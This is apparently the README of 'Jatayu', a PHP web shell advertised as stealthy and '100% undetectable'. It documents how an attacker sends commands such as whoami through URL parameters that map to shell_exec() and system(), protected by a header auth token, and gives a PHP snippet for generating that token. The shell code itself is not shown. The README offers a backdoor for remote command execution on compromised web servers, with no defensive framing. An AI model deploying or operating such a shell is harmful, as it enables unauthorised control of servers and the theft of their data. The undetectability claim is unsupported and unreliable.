<h1 align="center">
  <a href=""><img src="https://github.com/SpiderMate/Jatayu/blob/master/jatayu-image.png" width="100" height="100" alt="Jatayu"></a>
  <br>
  JATAYU
  <br>
</h1>

<h4 align="center">Stealthy Stand Alone PHP Web Shell</h4>

<p align="center">
    <img src="https://img.shields.io/badge/release-Prv8-blue.svg">
    <img src="https://img.shields.io/badge/issues-0-red.svg">
    <img src="https://img.shields.io/badge/php-7-green.svg">
    <img src="https://img.shields.io/badge/php-5-green.svg">
</p>

### FEATURES
- Http Header Based Authentication.
- 100% Undetectable.
- Exec Function Changer.

### USAGE
```
GET /test/shell.php?fn=1&&cmd=whoami
Host : http://test.com
Authtoken : bb3b1a1f-0447-42a6-955a-88681fb88499
```
### FUNCTIONS

| PARAMETER       | FUNCTION                       |
| ----------------|:------------------------------:|
| fn=1            | Calls function shell_exec()    |
| fn=2            | Calls function system()        |
| cmd=id          | Executes command               |

### GENERATE AUTHTOKEN
```
<?php
$r = unpack('v*', fread(fopen('/dev/random', 'r'),16));
$apiKey = sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
    $r[1], $r[2], $r[3], $r[4] & 0x0fff | 0x4000,
    $r[5] & 0x3fff | 0x8000, $r[6], $r[7], $r[8]);
echo $apiKey;
    
?>
```


